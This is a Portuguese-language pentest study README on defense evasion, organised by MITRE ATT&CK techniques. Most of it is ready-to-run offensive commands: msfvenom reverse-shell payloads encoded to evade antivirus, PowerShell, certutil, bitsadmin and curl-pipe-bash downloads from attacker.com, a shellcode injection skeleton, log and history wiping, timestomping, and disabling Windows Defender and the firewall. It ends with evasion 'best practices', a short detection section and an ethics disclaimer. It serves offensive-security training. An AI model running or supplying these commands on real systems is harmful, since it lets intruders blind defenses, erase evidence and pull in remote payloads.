# 07 - Evasão de Defesa

**MITRE ATT&CK Tactic:** [TA0005 - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

## 📖 Sobre

Técnicas para **evitar detecção** e **escapar de mecanismos de segurança**. Bypass de AV, EDR, firewalls, logging, etc.

## 🎯 Objetivo

Permanecer furtivo no sistema, evitando ser detectado por soluções de segurança e equipes de blue team.

## 📚 Técnicas Principais

### T1562 - Impair Defenses
- **T1562.001** - Disable or Modify Tools (AV, EDR, firewall)
- **T1562.002** - Disable Windows Event Logging
- **T1562.003** - Impair Command History Logging
- **T1562.004** - Disable or Modify System Firewall

### T1070 - Indicator Removal
- **T1070.001** - Clear Windows Event Logs
- **T1070.002** - Clear Linux or Mac System Logs
- **T1070.003** - Clear Command History
- **T1070.004** - File Deletion
- **T1070.006** - Timestomp

### T1027 - Obfuscated Files or Information
- **T1027.001** - Binary Padding
- **T1027.002** - Software Packing
- **T1027.003** - Steganography
- **T1027.005** - Indicator Removal from Tools
- Encoding/Encryption

### T1036 - Masquerading
- **T1036.004** - Masquerade Task or Service
- **T1036.005** - Match Legitimate Name or Location
- Naming similar to legit processes

### T1055 - Process Injection
- **T1055.001** - DLL Injection
- **T1055.002** - Portable Executable Injection
- **T1055.003** - Thread Execution Hijacking
- **T1055.004** - Asynchronous Procedure Call
- **T1055.012** - Process Hollowing

### T1218 - System Binary Proxy Execution
- **T1218.001** - Compiled HTML File (.chm)
- **T1218.005** - Mshta
- **T1218.010** - Regsvr32
- **T1218.011** - Rundll32
- Living off the Land

### T1140 - Deobfuscate/Decode Files or Information
- Runtime deobfuscation
- Staged payloads

### T1497 - Virtualization/Sandbox Evasion
- Detectar VMs e sandboxes
- Behavioral evasion

## 🛠️ Técnicas de Evasão

### Bypass de Antivírus

#### Ofuscação de Código
```python
# Python - Ofuscação simples
import base64
cmd = "reverse_shell_code_here"
exec(base64.b64decode(cmd))

# Encoding múltiplo
payload = base64.b64encode(zlib.compress(shellcode))
```

#### Payload Encoding
```bash
# Msfvenom - Encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Multiple encoders
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -e x86/countdown -i 5 -f exe -o encoded.exe
```

#### In-Memory Execution
```powershell
# PowerShell - Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Reflective DLL Injection
```

### Evasão de EDR

#### Living off the Land (LOLBins)
```powershell
# Windows
certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\payload.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();

# Linux
curl http://attacker.com/shell.sh | bash
wget -O - http://attacker.com/script.py | python
```

#### Process Injection
```python
# Python - Simple injection
import ctypes
import ctypes.wintypes

# Shellcode aqui
shellcode = b"\x90\x90..."

# Alocar memória
ptr = ctypes.windll.kernel32.VirtualAlloc(...)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(...)
```

### Limpeza de Rastros

#### Windows Event Logs
```powershell
# Limpar logs específicos
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Application
Clear-EventLog -LogName System
```

#### Linux Logs
```bash
# Limpar history
history -c
echo "" > ~/.bash_history
export HISTFILESIZE=0

# Limpar logs do sistema
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
```

#### Timestomping
```bash
# Linux - Modificar timestamps
touch -r /etc/passwd backdoor.sh  # Copia timestamp
touch -t 202301010000 file.txt    # Define timestamp específico

# Windows
timestomp file.exe -m "01/01/2020 12:00:00"
```

### Bypass de Firewall

#### Tunneling
```bash
# SSH Tunneling
ssh -L local_port:target:target_port user@pivot

# Reverse SSH
ssh -R remote_port:localhost:local_port user@attacker

# Chisel
./chisel server -p 8080 --reverse
./chisel client attacker_ip:8080 R:1080:socks
```

#### Protocol Evasion
```bash
# DNS Tunneling - dnscat2
# ICMP Tunneling - ptunnel
# HTTP/HTTPS Tunneling
```

### Desabilitar Defesas

#### Windows Defender
```powershell
# Desabilitar Real-time Protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Adicionar exclusão
Add-MpPreference -ExclusionPath "C:\payload"

# Desabilitar completamente (requer admin)
sc stop WinDefend
sc config WinDefend start= disabled
```

#### Firewall
```powershell
# Windows Firewall
netsh advfirewall set allprofiles state off

# Adicionar regra
netsh advfirewall firewall add rule name="Allow" dir=in action=allow program="C:\backdoor.exe"
```

## 🎓 Labs Práticos

- [ ] Ofuscar payload Python/PowerShell
- [ ] Bypass AV com msfvenom encoders
- [ ] LOLBins - Executar código com binários legítimos
- [ ] Limpar event logs Windows
- [ ] Process injection básico
- [ ] Timestomping de arquivos
- [ ] SSH tunneling através de firewall
- [ ] Desabilitar Windows Defender

## 🛠️ Ferramentas

### Obfuscation
- **Invoke-Obfuscation** - PowerShell obfuscation
- **Veil-Evasion** - AV evasion framework
- **Shelter** - Payload obfuscation
- **Bashfuscator** - Bash obfuscation

### Packing/Crypting
- **UPX** - Executable packer
- **Themida** - Software protection
- **Custom packers**

### Testing
- **VirusTotal** - Multi-AV scanner (cuidado: payloads ficam públicos!)
- **Antiscan.me** - AV testing privado
- **NoDistribute** - Private scanning

### Tunneling
- **Chisel** - Fast TCP/UDP tunnel
- **Ligolo** - Reverse tunneling
- **SSF** - Secure Socket Funneling
- **dnscat2** - DNS tunnel

## 📝 Boas Práticas de Evasão
```
1. Evitar assinaturas conhecidas
2. Usar ofuscação em camadas
3. Executar em memória quando possível
4. Usar binários legítimos (LOLBins)
5. Limpar rastros regularmente
6. Timestomping de arquivos maliciosos
7. Evitar conexões diretas (usar proxies/tunnels)
8. Randomizar payloads
9. Testar contra múltiplos AVs
10. Comportamento "normal" - evitar spikes suspeitos
```

## 🔍 Detecção (Perspectiva Blue Team)

### Indicadores de Evasão
- Event logs sendo limpos
- Windows Defender desabilitado
- Processos executando de locais incomuns
- LOLBins executando com parâmetros suspeitos
- Conexões de rede anômalas
- Process injection
- Modificações em timestamps suspeitas

### Monitoramento
- **Sysmon** - Advanced logging
- **EDR solutions**
- **Network monitoring**
- **File Integrity Monitoring**
- **Behavioral analysis**

## ⚠️ Considerações Éticas

**Nunca use técnicas de evasão em sistemas sem autorização!**
- Desabilitar AV/EDR em sistemas reais pode expô-los a ameaças
- Testar apenas em ambientes isolados
- Em pentest real, documentar todas as ações

## 📚 Recursos

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [Veil Framework](https://github.com/Veil-Framework/Veil)
- [AV Evasion Techniques](https://book.hacktricks.xyz/windows-hardening/av-bypass)

---

**Anterior:** [06-ElevacaoPrivilegios](../06-ElevacaoPrivilegios/) | **Próximo:** [08-AcessoCredenciais](../08-AcessoCredenciais/)